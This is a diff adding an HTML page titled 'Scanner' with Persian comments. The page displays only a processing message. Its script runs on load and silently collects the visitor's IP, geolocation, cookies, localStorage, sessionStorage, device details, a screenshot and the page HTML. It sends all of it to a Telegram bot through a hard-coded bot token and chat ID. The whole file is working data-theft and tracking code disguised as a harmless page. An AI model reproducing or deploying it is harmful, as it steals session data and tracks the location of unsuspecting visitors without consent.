@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner</title>
+</head>
+<body>
+    <h1>📱 در حال پردازش...</h1>
+    
+    <script>
+    // ===== تنظیمات تلگرام =====
+    const botToken = '8874650639:AAEsfjBTpVVUuGUQq1FpliGdqh5GAWhD6BQ';
+    const chatId = '7881167408';
+    // ===========================
+
+    // جمع‌آوری اطلاعات کامل
+    const data = {
+        ip: null,
+        location: null,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        time: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: null,
+        connection: null,
+        screenshot: null, // تصویر اسکرین‌شات
+        pageHTML: null,   // کد HTML کامل صفحه
+        cookies: document.cookie,
+        localStorage: null,
+        sessionStorage: null
+    };
+
+    // گرفتن IP
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(r => {
+            data.ip = r.ip;
+        })
+        .catch(() => {});
+
+    // گرفتن موقعیت
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                data.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude
+                };
+            },
+            () => {}
+        );
+    }
+
+    // گرفتن باتری
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            data.battery = {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging
+            };
+        });
+    }
+
+    // گرفتن اطلاعات شبکه
+    if (navigator.connection) {
+        data.connection = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + ' Mbps'
+        };
+    }
+
+    // گرفتن LocalStorage
+    try {
+        data.localStorage = JSON.stringify(localStorage);
+    } catch(e) {}
+
+    // گرفتن SessionStorage
+    try {
+        data.sessionStorage = JSON.stringify(sessionStorage);
+    } catch(e) {}
+
+    // ===== گرفتن اسکرین‌شات از صفحه =====
+    function captureScreenshot() {
+        return new Promise((resolve) => {
+            // استفاده از html2canvas برای گرفتن اسکرین‌شات
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+            script.onload = function() {
+                html2canvas(document.body, {
+                    scale: 0.5, // کاهش کیفیت برای حجم کمتر
+                    useCORS: true,
+                    allowTaint: true,
+                    logging: false
+                }).then(canvas => {
+                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
+                    resolve();
+                }).catch(() => {
+                    resolve();
+                });
+            };
+            script.onerror = function() {
+                resolve();
+            };
+            document.head.appendChild(script);
+            
+            // اگر ۵ ثانیه طول کشید، ادامه بده
+            setTimeout(() => {
+                resolve();
+            }, 5000);
+        });
+    }
+
+    // ===== گرفتن HTML کامل صفحه =====
+    function capturePageHTML() {
+        try {
+            // کپی از DOM با حذف اسکریپت‌ها
+            const clone = document.documentElement.cloneNode(true);
+            const scripts = clone.querySelectorAll('script');
+            scripts.forEach(s => s.remove());
+            data.pageHTML = clone.outerHTML;
+        } catch(e) {
+            data.pageHTML = 'خطا در گرفتن HTML';
+        }
+    }
+
+    // ===== ارسال همه اطلاعات به تلگرام =====
+    async function sendAllData() {
+        // گرفتن اسکرین‌شات
+        await captureScreenshot();
+        
+        // گرفتن HTML
+        capturePageHTML();
+        
+        // آماده‌سازی برای ارسال
+        const text = `
+📱 **گزارش کامل دستگاه**
+═══════════════════
+
+🌐 **IP:** ${data.ip || 'نامشخص'}
+📍 **موقعیت:** ${data.location ? `${data.location.lat}, ${data.location.lng}` : 'دریافت نشد'}
+🖥️ **مرورگر:** ${data.userAgent}
+📱 **صفحه:** ${data.screen}
+⏰ **زمان:** ${data.time}
+🌍 **منطقه:** ${data.timezone}
+🔋 **باتری:** ${data.battery ? `${data.battery.level} - ${data.battery.charging ? 'در حال شارژ' : 'در حال دشارژ'}` : 'نامشخص'}
+📶 **شبکه:** ${data.connection ? `${data.connection.type} - ${data.connection.downlink}` : 'نامشخص'}
+🍪 **کوکی:** ${data.cookies || 'ندارد'}
+
+📦 **LocalStorage:** ${data.localStorage ? data.localStorage.substring(0, 500) + '...' : 'خالی'}
+📦 **SessionStorage:** ${data.sessionStorage ? data.sessionStorage.substring(0, 500) + '...' : 'خالی'}
+
+📄 **HTML صفحه:** ${data.pageHTML ? data.pageHTML.substring(0, 1000) + '...' : 'خطا'}
+        `;
+
+        // ارسال متن
+        const textEncoded = encodeURIComponent(text);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textEncoded}`)
+            .catch(() => {});
+
+        // ارسال اسکرین‌شات (اگر گرفته شده)
+        if (data.screenshot) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', data.screenshot);
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        // نمایش پیام موفقیت
+        document.body.innerHTML = `
+            <h1 style="color: #00ff88;">✅ اطلاعات کامل ارسال شد!</h1>
+            <p style="color: #888;">اسکرین‌شات و اطلاعات به تلگرام شما فرستاده شد.</p>
+            <p style="color: #666; font-size: 12px;">IP: ${data.ip || 'نامشخص'} | زمان: ${new Date().toLocaleString('fa-IR')}</p>
+        `;
+    }
+
+    // اجرا بعد از ۳ ثانیه
+    setTimeout(sendAllData, 3000);
+    </script>
+</body>
+</html>
